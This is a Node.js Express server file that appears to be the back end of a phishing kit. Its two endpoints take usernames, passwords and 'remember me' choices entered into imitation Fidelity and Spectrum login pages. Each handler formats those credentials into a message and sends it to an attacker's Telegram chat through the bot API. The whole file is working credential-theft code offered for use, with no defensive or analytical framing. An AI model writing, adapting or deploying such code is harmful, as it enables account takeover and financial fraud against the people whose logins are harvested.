import dotenv from "dotenv";
dotenv.config();
     

const express = require("express");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");

const app = express();
const PORT = process.env.PORT || 3000;

// Use environment variables for your Telegram credentials
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.use(bodyParser.json());
app.use(express.static("public")); // If you serve your html from a 'public' folder

// Helper function to send messages to Telegram
async function sendTelegramMessage(message) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const payload = {
    chat_id: CHAT_ID,
    text: message,
    parse_mode: "Markdown",
  };

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    return response.json();
  } catch (error) {
    console.error("Error sending message to Telegram:", error);
  }
}

// Endpoint to receive Fidelity login form submission
app.post("/send-login", async (req, res) => {
  const { username, password, remember } = req.body;

  const message = `
*Fidelity Login Credentials:*
- Username: \`${username}\`
- Password: \`${password}\`
- Remember Username: ${remember ? "Yes" : "No"}
  `;

  await sendTelegramMessage(message);
  res.sendStatus(200);
});

// Endpoint to receive Spectrum login form submission
app.post("/send-spectrum-login", async (req, res) => {
  const { spectrumUsername, spectrumPassword, staySignedIn } = req.body;

  const message = `
*Spectrum Login Credentials:*
- Username: \`${spectrumUsername}\`
- Password: \`${spectrumPassword}\`
- Stay Signed In: ${staySignedIn ? "Yes" : "No"}
  `;

  await sendTelegramMessage(message);
  res.sendStatus(200);
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

